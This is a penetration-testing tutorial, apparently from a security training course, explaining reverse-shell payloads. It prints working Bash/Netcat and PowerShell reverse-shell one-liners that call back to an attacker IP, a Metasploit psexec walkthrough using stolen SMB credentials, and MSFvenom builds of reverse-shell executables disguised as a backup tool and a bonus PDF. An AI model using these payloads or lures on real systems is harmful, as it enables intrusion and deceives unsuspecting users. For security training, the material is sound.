# Shells & Payloads: Introduction to Payloads 

---

## Table of Contents

1. [Payloads are just instructions](#1-payloads-are-just-instructions)
2. [Dissecting the Netcat/Bash one-liner](#2-dissecting-the-netcatbash-one-liner)
3. [Dissecting the PowerShell one-liner](#3-dissecting-the-powershell-one-liner)
4. [Payloads take many shapes](#4-payloads-take-many-shapes)
5. [Using Metasploit to deliver a payload](#5-using-metasploit-to-deliver-a-payload)
6. [Crafting payloads with MSFvenom](#6-crafting-payloads-with-msfvenom)
7. [Staged vs. stageless — a deeper look](#7-staged-vs-stageless--a-deeper-look)
8. [Building and delivering a stageless Linux payload](#8-building-and-delivering-a-stageless-linux-payload)
9. [Building and delivering a stageless Windows payload](#9-building-and-delivering-a-stageless-windows-payload)
10. [Cheat sheet](#10-cheat-sheet)

---

## 1. Payloads are just instructions

Before anything else: **don't be intimidated by the word "payload."** Think of it like a text message or email — when you send one, the actual words you wrote are the payload; the network headers and routing information are just the wrapper getting it there.

In the same way, a security payload is simply **a set of instructions delivered to a target computer**. The difference is that those instructions are designed to do something the system's owner hasn't authorized — but mechanically, it's no different from any other program telling a computer what to do.

> The terms "malware" and "malicious code" make the concept sound more exotic than it is. When working with payloads, the goal should always be to understand *exactly* what each instruction does — not to treat it as a black box.

This understanding matters practically: when AV blocks your payload, knowing what each part does helps you figure out *which part* triggered detection, and why.

---

## 2. Dissecting the Netcat/Bash one-liner

This is one of the most commonly copy-pasted shell payloads on the internet — but rarely broken down. Let's fix that.

### The full one-liner

```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.10.14.12 7777 > /tmp/f
```

This runs on a **Linux target** to create a Bash shell that communicates back to a Netcat listener on the attacker's machine. Here it is, piece by piece:

### Step-by-step breakdown

```
rm -f /tmp/f;
```
Removes `/tmp/f` if it already exists. The `-f` flag tells `rm` not to complain if the file doesn't exist. The `;` just runs the next command right after, regardless of the outcome.

```
mkfifo /tmp/f;
```
Creates a **named pipe** (FIFO = First In, First Out) at `/tmp/f`. A named pipe is a special file type that acts like a two-way data corridor between processes — not a regular file, just a channel.

> **Analogy:** imagine a named pipe as a pneumatic tube in a bank. Data goes in one end and comes out the other. This one connects the network connection to the shell, and back again.

```
cat /tmp/f |
```
Reads from the named pipe and passes its contents into the next command via the `|` (pipe).

```
/bin/bash -i 2>&1 |
```
Starts an **interactive** (`-i`) Bash shell. The `2>&1` part merges the error output stream (stderr, `2`) into the standard output stream (stdout, `1`), so both normal output and error messages flow through the same pipe to the network. The trailing `|` sends everything into the next command.

```
nc 10.10.14.12 7777 > /tmp/f
```
Netcat opens a connection back to the attacker at `10.10.14.12` on port `7777`. The `>` redirects Netcat's output (commands coming *from* the attacker) back into the named pipe `/tmp/f`, completing the loop.

### The full data flow, visualized

```
Attacker types a command
         │
         ▼ (arrives via TCP)
      nc → /tmp/f (named pipe)
         │
         ▼
      cat reads pipe → feeds into bash -i
         │
         ▼
      bash executes command
         │
         ▼ (output + errors, via 2>&1)
      stdout → nc → TCP back to attacker
```

It's a **loop**: commands come in through the named pipe, bash runs them, and the output goes back out through Netcat. Each command the attacker types travels through this loop.

---

## 3. Dissecting the PowerShell one-liner

This is the Windows equivalent — used when you need to establish a reverse shell from inside `cmd.exe` (e.g. via a Remote Code Execution vulnerability that gives you command-prompt access).

### The full one-liner

```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

It looks overwhelming. Let's take it apart in logical chunks.

### Step-by-step breakdown

```powershell
powershell -nop -c
```
Calls `powershell.exe` with two flags: `-nop` (no profile — skips loading the user's PowerShell profile, which could interfere) and `-c` (run the following string as a command/script block). This is how you launch PowerShell commands from inside `cmd.exe`.

---

```powershell
$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);
```
Creates a **TCP socket** object called `$client` and connects it to the attacker's machine at `10.10.14.158` on port `443`. Port `443` is used here because it's the standard HTTPS port — traffic on port 443 is less likely to raise firewall flags than a non-standard port.

---

```powershell
$stream = $client.GetStream();
```
Opens the **data stream** on that TCP connection — the actual channel through which bytes will flow back and forth.

---

```powershell
[byte[]]$bytes = 0..65535|%{0};
```
Creates an **empty byte array** of 65,535 zeros. This is a buffer that will hold incoming data from the attacker before it gets processed.

---

```powershell
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)
```
Starts a **loop** that keeps reading data from the network stream into the `$bytes` buffer as long as there's something to read (i.e. while the connection is open and the attacker is sending commands).

---

```powershell
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i);
```
Converts the raw bytes received from the network into a readable **ASCII string** so the commands can be understood by PowerShell.

---

```powershell
$sendback = (iex $data 2>&1 | Out-String);
```
`iex` is shorthand for `Invoke-Expression` — it **runs whatever string was received** as a PowerShell command. The result (plus any errors, via `2>&1`) is captured and converted to a string.

> `iex` is the core of the whole payload. Everything else is networking plumbing — `iex $data` is what actually *executes* the attacker's commands on the target machine.

---

```powershell
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
```
Builds the **shell prompt** to send back — it adds the `PS C:\current\directory> ` prefix to the output, so the attacker sees a recognizable PowerShell-style prompt.

---

```powershell
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte, 0, $sendbyte.Length);
$stream.Flush()
```
Converts the output back to **bytes**, sends it back through the TCP stream to the attacker, and flushes the buffer to ensure all data is actually transmitted.

---

```powershell
$client.Close()
```
When the loop ends (connection dropped/closed), this cleanly **closes the TCP connection**.

### The full data flow, visualized

```
Attacker types command
       │
       ▼ (TCP, port 443)
  $stream.Read() into $bytes buffer
       │
       ▼
  ASCII decode → $data
       │
       ▼
  iex $data  ← THIS IS WHERE THE COMMAND RUNS
       │
       ▼
  Output captured → $sendback
       │
       ▼
  Prepend "PS C:\path> " → $sendback2
       │
       ▼
  Encode as bytes → $stream.Write()
       │
       ▼ (TCP back to attacker)
  Attacker sees output + prompt
```

The loop repeats this cycle for every command, until the connection is closed.

---

## 4. Payloads take many shapes

Both one-liners above are manually crafted, purpose-built payloads typed or pasted directly into a shell prompt. But payloads come in many other forms:

| Form | Description |
|---|---|
| **One-liners** | Single commands executed directly in a shell (as shown above) |
| **Script files** | `.ps1`, `.sh`, `.py`, `.php` files, more readable and reusable |
| **Compiled executables** | `.exe`, `.elf` — look like normal programs, harder to visually inspect |
| **Framework-generated** | Built automatically by Metasploit, MSFvenom, or similar tools |
| **Social engineering lures** | Disguised as PDFs, invoices, software updates, etc. |

**What determines which shape you use:** the target's OS, the available shell interpreters (bash, PowerShell, Python, etc.), what languages or runtimes are installed, and your delivery method all influence which payload type will actually work in a given scenario.

---

## 5. Using Metasploit to deliver a payload

Metasploit is an **automated attack framework** — instead of building and delivering payloads by hand, it handles most of the mechanics for you. This is valuable for speed, but the responsibility is on you to understand what it's actually doing.

### Recon first

```bash
$ nmap -sC -sV -Pn 10.129.164.25

PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
```

The open ports tell us this is a **Windows machine** with **SMB** (port 445) exposed — a classic attack surface.

### Search for a relevant module

```
msf6 > search smb
```

This returns a long list. Here's how to read a module entry:

```
56  exploit/windows/smb/psexec
```

| Part | Meaning |
|---|---|
| `56` | Index number for this search — use `use 56` to select it quickly |
| `exploit/` | Module type: this is an exploit module |
| `windows/` | Target platform: Windows |
| `smb/` | The service being attacked: SMB |
| `psexec` | The delivery mechanism: PsExec (a tool that remotely executes programs via admin shares) |

### Select the module and check options

```
msf6 > use 56

[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp

msf6 exploit(windows/smb/psexec) >
```

```
msf6 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):
   RHOSTS                               yes  The target host(s)
   RPORT    445                         yes  The SMB service port
   SHARE                                no   The share to connect to
   SMBDomain  .                         no   The Windows domain
   SMBPass                              no   The password for the specified username
   SMBUser                              no   The username to authenticate as

Payload options (windows/meterpreter/reverse_tcp):
   EXITFUNC  thread                     yes  Exit technique
   LHOST     68.183.42.102              yes  The listen address
   LPORT     4444                       yes  The listen port

Exploit target:
   0  Automatic
```

**Key observation:** this module needs **valid SMB credentials** (SMBUser/SMBPass) — this isn't a blind exploit, it's exploiting *authenticated access* to deliver a payload. This is a common scenario in internal engagements where credentials have been obtained.

### Configure and fire

```
msf6 exploit(windows/smb/psexec) > set RHOSTS 10.129.180.71
msf6 exploit(windows/smb/psexec) > set SHARE ADMIN$
msf6 exploit(windows/smb/psexec) > set SMBPass admin123!
msf6 exploit(windows/smb/psexec) > set SMBUser john
msf6 exploit(windows/smb/psexec) > set LHOST 10.10.14.222
```

| Setting | Purpose |
|---|---|
| `RHOSTS` | The target's IP — where the payload goes |
| `SHARE ADMIN$` | The Windows admin share used to upload the payload |
| `SMBUser` / `SMBPass` | Credentials to authenticate with over SMB |
| `LHOST` | Your IP — where the reverse shell calls back to |

```
msf6 exploit(windows/smb/psexec) > exploit

[*] Started reverse TCP handler on 10.10.14.222:4444
[*] 10.129.180.71:445 - Authenticating to 10.129.180.71:445 as user 'john'...
[*] 10.129.180.71:445 - Executing the payload...
[*] Sending stage (175174 bytes) to 10.129.180.71
[*] Meterpreter session 1 opened (10.10.14.222:4444 -> 10.129.180.71:49675) at 2021-09-13 17:43:41 +0000

meterpreter >
```

### Dropping into a full system shell from Meterpreter

```
meterpreter > shell

Process 604 created.
Channel 1 created.
Microsoft Windows [Version 10.0.18362.1256]

C:\WINDOWS\system32>
```

If Meterpreter's command set doesn't cover something you need, `shell` drops you into the native Windows `cmd.exe` where you have the full range of Windows commands.

---

## 6. Crafting payloads with MSFvenom

**MSFvenom** is the payload *builder* — a command-line tool that generates standalone payload files you can deliver manually (via email, USB, download link, etc.) rather than needing a live network connection to the target at the moment of delivery.

It also supports **encoding and encryption** to help payloads avoid common AV signatures (covered in depth in the Metasploit series, Part 5).

### List all available payloads

```bash
$ msfvenom -l payloads

Framework Payloads (592 total) [--payload <value>]
==================================================

    Name                                             Description
    ----                                             -----------
    linux/x86/shell/reverse_nonx_tcp                Spawn a command shell (staged). Connect back to the attacker
    linux/x86/shell/reverse_tcp                     Spawn a command shell (staged). Connect back to the attacker
...
```

---

## 7. Staged vs. stageless — a deeper look

We covered this in Part 4 of the Metasploit series, but MSFvenom's naming conventions make it concrete. The **name itself** tells you which type a payload is.

### The rule: slashes signal stages

| Payload name | Type | Why |
|---|---|---|
| `linux/x86/shell/reverse_tcp` | **Staged** | Each `/` after the OS represents a separate stage being delivered — `/shell/` is stage 1, `/reverse_tcp` is stage 2 |
| `linux/zarch/meterpreter_reverse_tcp` | **Stageless** | The shell and network code are merged into one segment after the OS/arch — `meterpreter_reverse_tcp` is a single delivery |
| `windows/meterpreter/reverse_tcp` | **Staged** | Note the `/` between `meterpreter` and `reverse_tcp` |
| `windows/meterpreter_reverse_tcp` | **Stageless** | The underscore `_` instead of `/` — merged into one |

> **Quick mental check:** look for a `/` between the shell type and the connection type. Slash = staged. Underscore/merged = stageless.

### When to use which

| Situation | Better choice | Why |
|---|---|---|
| Good network connection | Staged | Smaller initial delivery, full features after stage 2 loads |
| Poor/unreliable bandwidth | Stageless | No second download needed, no risk of a botched stage delivery |
| Social engineering delivery (email, USB) | Stageless | Less suspicious network traffic — the whole payload is in one file |
| AV evasion | Stageless can help | Less traffic going over the wire means fewer opportunities for network-based detection |

---

## 8. Building and delivering a stageless Linux payload

### Build it

```bash
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf

[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 74 bytes
Final size of elf file: 194 bytes
```

### Flag-by-flag breakdown

| Flag/Value | Meaning |
|---|---|
| `msfvenom` | The payload generation tool |
| `-p linux/x64/shell_reverse_tcp` | **Stageless** Linux 64-bit reverse TCP shell (note: `shell_reverse_tcp` with an underscore = stageless) |
| `LHOST=10.10.14.113` | The attacker's IP — where the target will call back to |
| `LPORT=443` | Port 443 (HTTPS) — chosen to blend in with normal outbound web traffic |
| `-f elf` | Output as a Linux **ELF executable** (the Linux equivalent of a `.exe`) |
| `> createbackup.elf` | Save to a file named `createbackup.elf` — the name is intentionally benign-looking |

> **Social engineering note:** the filename `createbackup.elf` is chosen to look like a legitimate sysadmin utility — something a network admin might plausibly double-click on. File naming is a real part of payload delivery design.

### Deliver and catch it

On the attacker machine, set up a listener **before** the target executes the file:

```bash
$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
```

When the target executes `createbackup.elf`, the shell calls back:

```bash
Connection received on 10.129.138.85 60892
env
PWD=/home/john/Downloads
ls
Desktop  Documents  Downloads  Music  Pictures  Public  Templates  Videos
```

You now have a live shell on the Linux target, interacting through Netcat.

### Delivery vectors (not just hand-to-hand)

| Method | Scenario |
|---|---|
| Email attachment | Social engineer the target into running it |
| Download link | Host it on a controlled web server, trick the target into downloading it |
| Combined with an MSF exploit | Used after gaining initial internal access |
| Physical media (USB) | Onsite penetration test with physical access |

---

## 9. Building and delivering a stageless Windows payload

The process is identical — just changing the platform and output format.

### Build it

```bash
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

| Changed flag/value | Why it changed |
|---|---|
| `windows/shell_reverse_tcp` | Targeting Windows now, with a Windows reverse shell |
| `-f exe` | Output as a Windows executable (`.exe`) instead of an ELF |
| `BonusCompensationPlanpdf.exe` | A socially engineered filename — looks like a PDF about bonuses, something an employee would open |

### AV reality check

> **Without any encoding or encryption, Windows Defender will almost certainly detect and block this payload.** The raw, unencoded MSFvenom output carries recognizable signatures that modern AV engines have been trained on for years.

For a payload like this to work in the real world, it would need additional obfuscation, encoding, or packing — topics explored separately in the AV evasion sections of this learning path.

If AV *were* disabled, delivery would look like this:

```bash
$ sudo nc -lvnp 443

Listening on 0.0.0.0 443
Connection received on 10.129.144.5 49679
Microsoft Windows [Version 10.0.18362.1256]

C:\Users\john\Downloads>dir
 Volume in drive C has no label.

 Directory of C:\Users\john\Downloads

09/23/2021  10:26 AM            73,802 BonusCompensationPlanpdf.exe
               1 File(s)         73,802 bytes
```

The user double-clicks what they think is a PDF, the executable runs, and the reverse shell calls back.

---

## 10. Cheat sheet

### Reading a payload name

```
platform / arch / shell_connection       ← Stageless (underscore between shell and connection)
platform / arch / shell / connection     ← Staged (slash between shell and connection)
```

### MSFvenom core flags

| Flag | Purpose |
|---|---|
| `-p <payload>` | Specify the payload to generate |
| `LHOST=<ip>` | Attacker's IP (reverse callback destination) |
| `LPORT=<port>` | Attacker's port |
| `-f <format>` | Output format: `elf` (Linux), `exe` (Windows), `raw`, `perl`, `python`, etc. |
| `-e <encoder>` | Encoder to apply (e.g. `x86/shikata_ga_nai`) |
| `-i <n>` | Number of encoding iterations |
| `-o <file>` | Output file path |
| `-l payloads` | List all available payloads |

### Staged vs. stageless summary

| Type | Name pattern | Use when |
|---|---|---|
| **Staged** | `shell/reverse_tcp` (slash) | Good network, want smaller initial delivery |
| **Stageless** | `shell_reverse_tcp` (underscore/merged) | Unreliable network, social engineering, AV concerns |

### Netcat listener (to catch reverse shells)

```bash
sudo nc -lvnp <port>
```

| Flag | Meaning |
|---|---|
| `-l` | Listen mode |
| `-v` | Verbose output |
| `-n` | No DNS resolution |
| `-p <port>` | Port to listen on |

### Big-picture takeaways

1. **Payloads are just instructions.** Don't treat them as a black box — the goal is to understand every piece of what a payload does.
2. **The bash one-liner works via a named pipe loop:** pipe → bash → pipe, with Netcat bridging the connection to the attacker.
3. **The PowerShell one-liner works via a TCP socket loop:** `iex` runs commands, output is encoded and sent back over the stream.
4. **`iex $data`** is the single most important line in the PowerShell payload — everything else is just plumbing to get data to and from it.
5. **MSFvenom builds standalone payload files** — useful when you can't reach the target over the network at the moment of delivery.
6. **Stageless payloads = one file, one delivery.** Better for social engineering and unreliable connections.
7. **Staged payloads = small first stage + full download after.** Better when you have reliable network access and want the full Meterpreter feature set.
8. **Raw MSFvenom payloads without encoding will be caught by modern AV.** Encoding/encryption/obfuscation is a separate, necessary step — covered later in the path.
9. **Port choice matters.** Using port `443` makes reverse shell traffic look like normal HTTPS to firewalls and network monitoring tools.

---
